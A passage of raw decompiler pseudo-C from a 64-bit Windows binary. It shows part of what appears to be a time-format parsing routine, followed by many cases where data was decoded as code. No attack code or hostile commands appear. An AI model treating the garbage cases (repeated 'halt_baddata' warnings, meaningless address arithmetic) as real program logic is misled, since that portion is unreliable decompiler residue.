*(ppiVar78 + -8) = 0x140035521;\n            fcn.140032a40(puVar66, arg3, in_stack_00000030, in_stack_00000038);\n            unaff_R13 = *(ppiVar78 + 0xb0);\n            unaff_RSI = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 0xc0) = unaff_R13;\n            *(ppiVar78 + 200) = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 100) = *(ppiVar78 + 0xd8);\n            if (*(ppiVar78 + 0xd8) == 0) {\n                *(*(ppiVar78 + 0x280) + 0x10) = *(ppiVar78 + 0xdc) + -1;\n                **(ppiVar78 + 0x290) = **(ppiVar78 + 0x290) | 8;\n            }\n            goto code_r0x0001400340c1;\n        case 'I':\n        case 'O':\n            unaff_R13 = *(ppiVar78 + 0xc0);\n            unaff_R14 = NULL;\n            while( true ) {\n                uVar43 = unaff_RSI == -1;\n                bVar90 = unaff_R13 != NULL && uVar43;\n                arg3 = bVar90;\n                if (bVar90) {\n                    if (unaff_R13[2] < unaff_R13[3]) {\n                        iVar47 = *unaff_R13[2];\n                    }\n                    else {\n                        piVar55 = *unaff_R13;\n                        *(ppiVar78 + 0x70) = bVar90;\n                        pcVar3 = piVar55[9];\n                        *(ppiVar78 + -8) = 0x140035ce2;\n                        iVar47 = (*pcVar3)(unaff_R13);\n                        arg3 = *(ppiVar78 + 0x70);\n                    }\n                    uVar45 = arg3;\n                    uVar43 = 0;\n                    if (iVar47 == -1) {\n                        unaff_R13 = NULL;\n                        arg3 = NULL;\n                        *(ppiVar78 + 0xc0) = 0;\n                        uVar43 = uVar45;\n                    }\n                }\n                uVar45 = arg1;\n                uVar87 = unaff_RDI != NULL & uVar45;\n                if (uVar87 != 0) {\n                    if (unaff_RDI[2] < unaff_RDI[3]) {\n                        iVar47 = *unaff_RDI[2];\n                    }\n                    else {\n                        piVar55 = *unaff_RDI;\n                        *(ppiVar78 + 0x70) = arg3;\n                        pcVar3 = piVar55[9];\n                        *(ppiVar78 + -8) = 0x140035cf9;\n                        iVar47 = (*pcVar3)(unaff_RDI);\n                        arg3 = *(ppiVar78 + 0x70);\n                    }\n                    if (iVar47 == -1) {\n                        unaff_RDI = NULL;\n                        uVar45 = uVar87;\n                    }\n                    else {\n                        uVar45 = unaff_R14;\n                    }\n                }\n                if (uVar43 == uVar45) break;\ncode_r0x00014003498f:\n                if (arg3 != '\\0') {\n                    if (unaff_R13[2] < unaff_R13[3]) {\n                        iVar47 = *unaff_R13[2];\n                    }\n                    else {\n                        pcVar3 = (*unaff_R13)[9];\n                        *(ppiVar78 + -8) = 0x140035d0d;\n                        iVar47 = (*pcVar3)(unaff_R13);\n                    }\n                    if (iVar47 == -1) {\n                        *(ppiVar78 + 0xc0) = 0;\n                        unaff_R13 = NULL;\n                    }\n                }\n                pcVar3 = (*unaff_R12)[2];\n                *(ppiVar78 + -8) = 0x1400349a6;\n                cVar42 = (*pcVar3)(unaff_R12);\n                if (cVar42 == '\\0') break;\n                if (unaff_R13[2] < unaff_R13[3]) {\n                    unaff_R13[2] = unaff_R13[2] + 2;\n                }\n                else {\n                    pcVar3 = (*unaff_R13)[10];\n                    *(ppiVar78 + -8) = 0x140035b42;\n                    (*pcVar3)(unaff_R13);\n                }\n                unaff_RSI = 0xffffffff;\n                *(ppiVar78 + 200) = 0xffff;\n            }\n            goto code_r0x0001400340c1;\n        case 'K':\n            piVar69 = *(*(*(ppiVar78 + 0x80) + 0x10) + 0x40);\n            piVar54 = *(*(*(ppiVar78 + 0x80) + 0x10) + 0x48);\n            *(ppiVar78 + 0xe0) = piVar69;\n            *(ppiVar78 + 0xe8) = piVar54;\n            if ((*piVar69 == 0) || (*piVar54 == 0)) {\ncode_r0x0001400350c4:\n                unaff_R13 = *(ppiVar78 + 0xc0);\n            }\n            else {\n                *(ppiVar78 + 0x30) = 2;\n                *(ppiVar78 + 0x90) = unaff_RDI;\n                *(ppiVar78 + 0x98) = *(ppiVar78 + 0x78);\n                *(ppiVar78 + 0x40) = ppiVar78 + 0xd8;\n                *(ppiVar78 + 0xa0) = *(ppiVar78 + 0xc0);\n                *(ppiVar78 + 0xa4) = *(ppiVar78 + 0xc4);\n                *(ppiVar78 + 0xa8) = *(ppiVar78 + 200);\n                *(ppiVar78 + 0xac) = *(ppiVar78 + 0xcc);\n                *(ppiVar78 + 0x38) = *(ppiVar78 + 0x270);\n                *(ppiVar78 + 0x28) = ppiVar78 + 0xe0;\n                *(ppiVar78 + 0x20) = ppiVar78 + 0xdc;\n                *(ppiVar78 + -8) = 0x140035c22;\n                fcn.140032f70(ppiVar78 + 0xb0, *(ppiVar78 + 600), ppiVar78 + 0xa0, ppiVar78 + 0x90, *(ppiVar78 + 0x20), \n                              *(ppiVar78 + 0x28), *(ppiVar78 + 0x30), *(ppiVar78 + 0x38), *(ppiVar78 + 0x40), \n                              *(ppiVar78 + 0x48), *(ppiVar78 + 0x50), *(ppiVar78 + 0x58), *(ppiVar78 + 0x60), \n                              *(ppiVar78 + 0x68), *(ppiVar78 + 0x70), *(ppiVar78 + 0x78), *(ppiVar78 + 0x80));\n                unaff_R13 = *(ppiVar78 + 0xb0);\n                unaff_RSI = *(ppiVar78 + 0xb8);\n                *(ppiVar78 + 0xc0) = unaff_R13;\n                *(ppiVar78 + 200) = *(ppiVar78 + 0xb8);\n                *(ppiVar78 + 100) = *(ppiVar78 + 0xd8);\n                if ((*(ppiVar78 + 0xd8) == 0) && (*(ppiVar78 + 0xdc) != 0)) {\n                    *(*(ppiVar78 + 0x290) + 1) = *(*(ppiVar78 + 0x290) + 1) | 1;\n                }\n            }\n            goto code_r0x0001400340c1;\n        case 'M':\n            puVar66 = ppiVar78 + 0xb0;\n            uVar58 = *(*(*(ppiVar78 + 0x80) + 0x10) + 0x50);\n            *(ppiVar78 + 0xa0) = *(ppiVar78 + 0xc0);\n            *(ppiVar78 + 0xa4) = *(ppiVar78 + 0xc4);\n            *(ppiVar78 + 0xa8) = *(ppiVar78 + 200);\n            *(ppiVar78 + 0xac) = *(ppiVar78 + 0xcc);\n            break;\n        case 'R':\n            *(ppiVar78 + 0x30) = 6;\n            *(ppiVar78 + 0x28) = 0;\n            *(ppiVar78 + 0x98) = *(ppiVar78 + 0x78);\n            *(ppiVar78 + 0x48) = ppiVar78 + 0xd8;\n            *(ppiVar78 + 0x38) = 1;\n            *(ppiVar78 + 0x40) = *(ppiVar78 + 0x270);\n            *(ppiVar78 + 0x20) = ppiVar78 + 0xdc;\n            *(ppiVar78 + 0x90) = unaff_RDI;\n            *(ppiVar78 + 0xa0) = *(ppiVar78 + 0xc0);\n            *(ppiVar78 + 0xa4) = *(ppiVar78 + 0xc4);\n            *(ppiVar78 + 0xa8) = *(ppiVar78 + 200);\n            *(ppiVar78 + 0xac) = *(ppiVar78 + 0xcc);\n            *(ppiVar78 + -8) = 0x14003518a;\n            fcn.140032a40(ppiVar78 + 0xb0, *(ppiVar78 + 600), ppiVar78 + 0xa0, ppiVar78 + 0x90);\n            unaff_R13 = *(ppiVar78 + 0xb0);\n            unaff_RSI = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 0xc0) = unaff_R13;\n            *(ppiVar78 + 200) = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 100) = *(ppiVar78 + 0xd8);\n            if (*(ppiVar78 + 0xd8) == 0) {\n                *(*(ppiVar78 + 0x280) + 0x18) = *(ppiVar78 + 0xdc);\n                **(ppiVar78 + 0x290) = **(ppiVar78 + 0x290) | 2;\n            }\n            goto code_r0x0001400340c1;\n        case 'S':\n            pcVar53 = *(ppiVar78 + 0x80);\n            puVar66 = ppiVar78 + 0xb0;\n            puVar94 = *(ppiVar78 + 0xc0);\n            puVar95 = *(ppiVar78 + 200);\ncode_r0x0001400350ea:\n            uVar58 = *(*(pcVar53 + 0x10) + 0x10);\n            *(ppiVar78 + 0xa0) = puVar94;\n            *(ppiVar78 + 0xa8) = puVar95;\n            break;\n        case 'T':\n            *(ppiVar78 + 0x30) = 99;\n            *(ppiVar78 + 0x28) = 0;\n            *(ppiVar78 + 0x98) = *(ppiVar78 + 0x78);\n            *(ppiVar78 + 0x48) = ppiVar78 + 0xd8;\n            *(ppiVar78 + 0x38) = 2;\n            *(ppiVar78 + 0x40) = *(ppiVar78 + 0x270);\n            *(ppiVar78 + 0x20) = ppiVar78 + 0xdc;\n            *(ppiVar78 + 0x90) = unaff_RDI;\n            *(ppiVar78 + 0xa0) = *(ppiVar78 + 0xc0);\n            *(ppiVar78 + 0xa4) = *(ppiVar78 + 0xc4);\n            *(ppiVar78 + 0xa8) = *(ppiVar78 + 200);\n            *(ppiVar78 + 0xac) = *(ppiVar78 + 0xcc);\n            *(ppiVar78 + -8) = 0x1400359f7;\n            fcn.140032a40(ppiVar78 + 0xb0, *(ppiVar78 + 600), ppiVar78 + 0xa0, ppiVar78 + 0x90);\n            unaff_R13 = *(ppiVar78 + 0xb0);\n            unaff_RSI = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 0xc0) = unaff_R13;\n            *(ppiVar78 + 200) = *(ppiVar78 + 0xb8);\n            *(ppiVar78 + 100) = *(ppiVar78 + 0xd8);\n            if (*(ppiVar78 + 0xd8) == 0) {\n                *(*(ppiVar78 + 0x290) + 1) = *(*(ppiVar78 + 0x290) + 1) | 6;\n                bVar90 = *(ppiVar78 + 200) == -1;\n                if ((unaff_R13 != NULL) && (bVar90)) {\n                    if (unaff_R13[2] < unaff_R13[3]) {\n                        iVar47 = *unaff_R13[2];\n                    }\n                    else {\n                        pcVar3 = (*unaff_R13)[9];\n                        *(ppiVar78 + -8) = 0x1400360cc;\n                        iVar47 = (*pcVar3)();\n                    }\n                    if (iVar47 == -1) {\n                        *(ppiVar78 + 0xc0) = 0;\n                    }\n                    bVar90 = iVar47 == -1;\n                }\n                cVar42 = arg1;\n                cVar83 = uVar51;\n                cVar65 = cVar42;\n                if (cVar83 != '\\0') {\n                    if (unaff_RDI[2] < unaff_RDI[3]) {\n                        iVar47 = *unaff_RDI[2];\n                    }\n                    else {\n                        pcVar3 = (*unaff_RDI)[9];\n                        *(ppiVar78 + -8) = 0x1400360f1;\n                        iVar47 = (*pcVar3)(unaff_RDI);\n                    }\n                    if (iVar47 == -1) {\n                        unaff_RDI = NULL;\n                        unaff_RBP = NULL;\n                        cVar65 = cVar83;\n                    }\n                    else {\n                        cVar65 = '\\0';\n                    }\n                }\n                iVar85 = *(ppiVar78 + 0xdc);\n                if (bVar90 == cVar65) {\ncode_r0x000140035a70:\n                    if (iVar85 < 0x45) {\n                        iVar85 = iVar85 + 100;\n                    }\n                    unaff_R13 = *(ppiVar78 + 0xc0);\n                }\n                else {\n                    *(ppiVar78 + -8) = 0x140035d26;\n                    fcn.1400240d0(ppiVar78 + 0xc0);\n                    pcVar3 = (*unaff_R12)[0xc];\n                    *(ppiVar78 + -8) = 0x140035d39;\n                    cVar65 = (*pcVar3)();\n                    if (9 < cVar65 - 0x30U) goto code_r0x000140035a70;\n                    piVar55 = *(ppiVar78 + 0xc0);\n                    iVar85 = (cVar65 - 0x30U) + iVar85 * 10;\n                    piVar69 = piVar55[3];\n                    if (piVar55[2] < piVar69) {\n                        piVar54 = piVar55[2] + 1;\n                        *(ppiVar78 + 0xdc) = iVar85;\n                        piVar55[2] = piVar54;\n                        *(ppiVar78 + 200) = 0xffff;\n                    }\n                    else {\n                        pcVar3 = *(*piVar55 + 0x50);\n                        *(ppiVar78 + -8) = 0x140035f22;\n                        (*pcVar3)();\n                        *(ppiVar78 + 0xdc) = iVar85;\n                        piVar54 = piVar55[2];\n                        *(ppiVar78 + 200) = 0xffff;\n                        piVar69 = piVar55[3];\n                    }\n                    if (piVar54 < piVar69) {\n                        iVar47 = *piVar54;\n                    }\n                    else {\n                        pcVar3 = *(*piVar55 + 0x48);\n                        *(ppiVar78 + -8) = 0x140036131;\n                        iVar47 = (*pcVar3)();\n                    }\n                    if (iVar47 == -1) {\n                        *(ppiVar78 + 0xc0) = 0;\n                    }\n                    if (unaff_RBP != '\\0') {\n                        if (unaff_RDI[2] < unaff_RDI[3]) {\n                            iVar48 = *unaff_RDI[2];\n                        }\n                        else {\n                            pcVar3 = (*unaff_RDI)[9];\n                            *(ppiVar78 + -8) = 0x14003613f;\n                            iVar48 = (*pcVar3)(unaff_RDI);\n                        }\n                        if (iVar48 == -1) {\n                            unaff_RDI = NULL;\n                            cVar42 = unaff_RBP;\n                        }\n                        else {\n                            cVar42 = '\\0';\n                        }\n                    }\n                    if ((iVar47 == -1) == cVar42) {\n                        unaff_R13 = *(ppiVar78 + 0xc0);\n                    }\n                    else {\n                        *(ppiVar78 + -8) = 0x140035e83;\n                        fcn.1400240d0(ppiVar78 + 0xc0);\n                        pcVar3 = (*unaff_R12)[0xc];\n                        *(ppiVar78 + -8) = 0x140035e96;\n                        cVar42 = (*pcVar3)(unaff_R12);\n                        unaff_R13 = *(ppiVar78 + 0xc0);\n                        if (cVar42 - 0x30U < 10) {\n                            if (unaff_R13[2] < unaff_R13[3]) {\n                                unaff_R13[2] = unaff_R13[2] + 2;\n                            }\n                            else {\n                                pcVar3 = (*unaff_R13)[10];\n                                *(ppiVar78 + -8) = 0x1400360db;\n                                (*pcVar3)(unaff_R13);\n                                unaff_R13 = *(ppiVar78 + 0xc0);\n                            }\n                            *(ppiVar78 + 200) = 0xffff;\n                            *(ppiVar78 + 0xdc) = iVar85 * 10 + cVar42 + -0x30;\n                        }\n                    }\n                    iVar85 = *(ppiVar78 + 0xdc) + -0x76c;\n                    *(*(ppiVar78 + 0x290) + 1) = *(*(ppiVar78 + 0x290) + 1) & 0xfd;\n                }\n                *(*(ppiVar78 + 0x280) + 0x14) = iVar85;\n                unaff_RSI = *(ppiVar78 + 200);\n            }\n            goto code_r0x0001400340c1;\n        }\n        *(ppiVar78 + 0x90) = unaff_RDI;\n        *(ppiVar78 + 0x38) = uVar58;\n        *(ppiVar78 + 0x98) = *(ppiVar78 + 0x78);\n        *(ppiVar78 + 0x40) = *(ppiVar78 + 0x290);\ncode_r0x000140034cd2:\n        *(ppiVar78 + 0x30) = *(ppiVar78 + 0x280);\n        *(ppiVar78 + 0x28) = ppiVar78 + 0xd8;\n        *(ppiVar78 + 0x20) = *(ppiVar78 + 0x270);\n        *(ppiVar78 + -8) = 0x140034d16;\n        fcn.140033e90(puVar66, *(ppiVar78 + 600), ppiVar78 + 0xa0, ppiVar78 + 0x90);\n        unaff_RSI = *(ppiVar78 + 0xb8);\n        *(ppiVar78 + 0xc0) = *(ppiVar78 + 0xb0);\n        *(ppiVar78 + 200) = *(ppiVar78 + 0xb8);\n        *(ppiVar78 + 100) = *(ppiVar78 + 0xd8);\n        unaff_R13 = *(ppiVar78 + 0xb0);\n        goto code_r0x0001400340c1;\n    default:\n        *ppiVar60 = *ppiVar60 + uVar43;\n        piVar55 = in_stack_00000038[1];\n        in_stack_00000058 = *in_stack_00000030;\n        in_stack_00000060 = in_stack_00000030[1];\n        unaff_RDI = *in_stack_00000038;\n        uVar59 = in_stack_00000208 + 0xd0;\n        in_stack_000001f0 = arg3;\n        fcn.1400b3640(uVar59);\n        unaff_R12 = fcn.1400b3700(uVar59);\n        sub.msvcrt.dll_wcslen(in_stack_00000220);\n        unaff_RSI = in_stack_00000060 & 0xffff;\n        arg1 = uVar59 & 0xffffffffffffff00 | piVar55 == -1;\n        in_stack_000001e8 = 0x1400fdfd0;\n        puStack16 = NULL;\n        in_stack_00000070 = 0;\n        unaff_R13 = in_stack_00000058;\n        ppiVar75 = &piStack104;\n        goto joined_r0x000140033f92;\n    case 0x97:\n    case 0xb7:\n        ppiVar78 = &piStack104;\n        goto code_r0x000140034605;\n    case 0x98:\n    case 0xb8:\n    case 0xbe:\n        goto code_r0x000140034313;\n    case 0x99:\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *0xc5740414 = *0xc5740414 + -0x30;\n        *unaff_RDI = *unaff_RDI >> 5 | *unaff_RDI << 3;\n        *unaff_RDI = *unaff_RDI ^ uVar52;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        ppiVar78 = &piStack104;\n        goto code_r0x00014003539f;\n    case 0x9a:\n        pcVar53 = ppiVar60 & 0xffffffffffffffb0;\n        *pcVar53 = *pcVar53 + pcVar53;\n        arg1 = arg1 & 0xffffffffffffff00 | cVar42 + uVar68;\n        ppiVar78 = &piStack104;\n        goto code_r0x0001400350ea;\n    case 0x9e:\n        puVar86 = unaff_RBP + -0x77;\n        cVar42 = 0x2f < *puVar86;\n        *puVar86 = *puVar86 - 0x30;\n        pcVar3 = swi(0x89);\n        pcVar53 = (*pcVar3)(uVar58);\n        *(in_stack_00000030 + -0x75) = (*(in_stack_00000030 + -0x75) - puVar66) - cVar42;\n        uVar43 = pcVar53 + *pcVar53;\n        pcVar53 = (pcVar53 & 0xffffffffffffff00 | uVar43) - 0x2016fdf8;\n        *pcVar53 = *pcVar53 + uVar43;\n        out(arg3, uVar43);\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x9f:\n        uVar59 = puStackX16 & 0xffffffff;\n        ppiVar78 = &piStack104;\n        goto code_r0x000140034d4e;\n    case 0xa3:\n        goto code_r0x000140034c72;\n    case 0xa8:\n        *ppiVar60 = *ppiVar60 + uVar43;\n        ppiVar78 = &piStack104;\n        goto code_r0x000140034c36;\n    case 0xa9:\n        ppiVar78 = &piStack104;\n        if (SCARRY8(uVar59, 0x1400fdfd0)) goto code_r0x000140034ae2;\n        puVar76 = &stack0xffffffffffffff90;\n        cVar42 = '\\n';\n        do {\n            unaff_RBP = unaff_RBP + -4;\n            puVar76 = puVar76 + -1;\n            *puVar76 = *unaff_RBP;\n            cVar42 = cVar42 + -1;\n        } while ('\\0' < cVar42);\n        *(ppiVar60 + arg3 * 4) = in_FS;\n        *0x1010f9fb2 = *0x1010f9fb2 + uVar43 + *ppiVar60;\n        *0x13559c8d1 = *0x13559c8d1 >> 1 | *0x13559c8d1 << 7;\n        *0x1400fdfd0 = *0x1400fdfd0 + -1;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xaa:\n        *0x18c034a8c = *0x18c034a8c ^ uVar68;\n        ppiVar78 = &piStack104;\n        goto code_r0x000140034a93;\n    case 0xab:\n        ppiVar78 = &piStack104;\n        goto code_r0x00014003498f;\n    case 0xad:\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *(uVar59 + 0x1400fdf59) = *(uVar59 + 0x1400fdf59) + -0x30;\n        ppiVar78 = &piStack104;\n        goto code_r0x00014003489a;\n    case 0xae:\n        uVar59 = uVar52 + 0xcd599;\n        ppiVar78 = &piStack104;\n        goto code_r0x000140035757;\n    case 0xaf:\n        goto code_r0x0001400340c1;\n    case 0xb0:\n        *(unaff_RBP + 0x5003f7ec4) = *(unaff_RBP + 0x5003f7ec4) + -0x30;\n        pcVar53 = ppiVar60 & 0xffffffffffffffa0;\n        cVar65 = pcVar53;\n        *pcVar53 = *pcVar53 + cVar65;\n        pcVar53[-0x77] = pcVar53[-0x77] + -0x30;\n        *pcVar53 = *pcVar53 + cVar65;\n        pcVar53[-0x73] = pcVar53[-0x73] + -0x30;\n        *pcVar53 = *pcVar53 + cVar65;\n        arg1 = arg1 & 0xffffffffffffff00 | cVar42 + uVar68;\n        ppiVar78 = &piStack104;\n        goto code_r0x0001400354e4;\n    case 0xb9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xba:\n    case 0xbb:\n        goto code_r0x0001400344f0;\n    case 0xc0:\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *(unaff_RBP + -0x77) = *(unaff_RBP + -0x77) + -0x30;\n        pcVar3 = swi(0x48);\n        iVar67 = (*pcVar3)(uVar58);\n        ppiVar78 = auStack96;\n        iVar85 = iVar67;\n        goto code_r0x000140035002;\n    case 0xc3:\n        goto code_r0x0001400352aa;\n    case 0xc4:\n    case 0xca:\n        ppiVar78 = &piStack104;\n        goto code_r0x00014003477a;\n    case 0xc6:\n        *ppiVar60 = *ppiVar60 + uVar43;\n        arg1 = arg1 & 0xffffffffffffff00 | cVar42 + uVar68;\n        ppiVar78 = &piStack104;\n        goto code_r0x000140034eac;\n    case 200:\n        ppiVar78 = ppiVar60 & 0xffffffff;\n        pcVar53 = &piStack104 & 0xffffffc0;\n        *pcVar53 = *pcVar53 + pcVar53;\n        uVar43 = *unaff_RDI;\n        *unaff_RDI = *unaff_RDI + -0x30;\n        *(ppiVar78 + 0xa0) = *(ppiVar78 + 0xa0) + arg3 + (0x2f < uVar43);\n        goto code_r0x000140034cab;\n    case 0xcd:\n        goto code_r0x000140034f13;\n    case 0xce:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xcf:\n        *(ppiVar60 + unaff_RSI * 4) = in_FS;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *(unaff_RSI + -0x7d) = *(unaff_RSI + -0x7d) + uVar45;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd1:\n    case 0xe1:\n    case 0xef:\n    case 0xfd:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd2:\n    case 0xe2:\n    case 0xf0:\n    case 0xfe:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd3:\n    case 0xe3:\n    case 0xf1:\n    case 0xff:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd4:\n    case 0xe4:\n    case 0xf2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd5:\n    case 0xe5:\n    case 0xf3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xda:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xdb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xdc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xdd:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xde:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xe6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xe7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xe8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xe9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xea:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xeb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xec:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xed:\n        uVar73 = (arg3 << 0x20 | ppiVar60 & 0xffffffff) % iVar85 & 0xffffffff;\n        uVar59 = func_0x0001290fd83a(uVar58);\n        uVar87 = puVar66 >> 8;\n        uVar73 = (uVar73 << 0x20 | uVar59 & 0xffffffff) % iVar85 & 0xffffffff;\n        uVar59 = func_0x0001290fd842();\n        uVar73 = (uVar73 << 0x20 | uVar59 & 0xffffffff) % iVar85 & 0xffffffff;\n        uVar59 = func_0xc90fd84a();\ncode_r0x0001400fe04e:\n        uVar73 = (uVar73 << 0x20 | uVar59 & 0xffffffff) % iVar85 & 0xffffffff;\n        uVar59 = func_0x0001290fd852();\n        uVar73 = (uVar73 << 0x20 | uVar59 & 0xffffffff) % iVar85 & 0xffffffff;\n        uVar59 = func_0x0001290fd85a();\n        uVar73 = (uVar73 << 0x20 | uVar59 & 0xffffffff) % iVar85 & 0xffffffff;\n        uVar59 = func_0x0001290fd862();\n        uVar73 = ((uVar73 << 0x20 | uVar59 & 0xffffffff) % iVar85 << 0x20 | piStack104 & 0xffffffff) % iVar85 &\n                 0xffffffff;\n        piStack104 = 0x1400fe071;\n        uVar59 = func_0x0001290fd86e();\n        uVar59 = uVar73 << 0x20 | uVar59 & 0xffffffff;\n        bVar90 = uVar87 == arg1 >> 8;\n        uVar73 = (uVar59 % iVar85 << 0x20 | uVar59 / iVar85 & 0xffffffffU) % iVar85 & 0xffffffff;\n        piStack104 = 0x1400fe07d;\n        uVar59 = func_0x0001290fd87a();\n        uVar46 = (uVar73 << 0x20 | uVar59 & 0xffffffff) % iVar85;\n        out(*unaff_RSI, uVar46);\n        out(*(unaff_RSI + -1), uVar46);\n        if (bVar90) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xfa:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xfb:\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        puVar56 = uVar59 + 0x1400fe110 + arg3;\n        *puVar56 = *puVar56;\n        pcVar53 = uVar59 + 0x1400fe010 + arg3;\n        *pcVar53 = *pcVar53 << 1;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + arg3;\n        *ppiVar60 = *ppiVar60 + uVar52;\n        uVar87 = *ppiVar60;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        cVar42 = ppiVar60 & 0xffffffff;\n        if (*ppiVar60 == '\\0') {\n            *(uVar59 + 0x1400fdfd1) = *(uVar59 + 0x1400fdfd1) + uVar43 + CARRY1(uVar87, uVar43);\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *(uVar59 + 0x1414ff034) = *(uVar59 + 0x1414ff034) + ((ppiVar60 & 0xffffffff) >> 8);\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *(uVar59 + 0x1414ff05c) = *(uVar59 + 0x1414ff05c) + uVar43;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            uVar87 = *ppiVar60;\n            *ppiVar60 = *ppiVar60 + uVar45;\n            pcVar53 = in_GS_OFFSET + uVar59 + 0x1400fdfd1;\n            *pcVar53 = *pcVar53 + uVar43 + CARRY1(uVar87, uVar45);\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *ppiVar60 = *ppiVar60 + cVar42;\n            *ppiVar60 = *ppiVar60 + uVar52;\n            *ppiVar60 = *ppiVar60 + uVar43;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uVar87 = *ppiVar60;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *(unaff_RBP + 0x2802) = *(unaff_RBP + 0x2802) + -0x31 + CARRY1(uVar87, uVar43);\n        uVar87 = *ppiVar60;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        cVar65 = in_stack_00000030;\n        if (*ppiVar60 == '\\0') {\n            *(uVar59 + 0x1400fdfd1) = *(uVar59 + 0x1400fdfd1) + uVar43 + CARRY1(uVar87, uVar43);\n            *ppiVar60 = *ppiVar60 + uVar43;\n            uVar87 = *ppiVar60;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *(in_stack_00000030 + 1) = *(in_stack_00000030 + 1) + cVar65 + CARRY1(uVar87, uVar43);\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *ppiVar60 = *ppiVar60 + cVar42;\n            *ppiVar60 = *ppiVar60 + uVar52;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *(unaff_RSI + 2) = *(unaff_RSI + 2) & uVar45;\n            *ppiVar60 = *ppiVar60 + uVar52;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *(unaff_RDI + 2) = *(unaff_RDI + 2) + -0x32;\n            *ppiVar60 = *ppiVar60 + uVar52;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            uVar45 = *ppiVar60;\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *(unaff_RBP + 0x2802) = *(unaff_RBP + 0x2802) + -0x32 + CARRY1(uVar45, uVar43);\n            *ppiVar60 = *ppiVar60 + uVar43;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        puVar86 = uVar59 + 0x1400fe027;\n        uVar87 = *puVar86;\n        *puVar86 = *puVar86 + uVar45;\n        *(uVar59 + 0x1400fdfd1) = *(uVar59 + 0x1400fdfd1) + uVar43 + CARRY1(uVar87, uVar45);\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 = *ppiVar60 + uVar43;\n        *ppiVar60 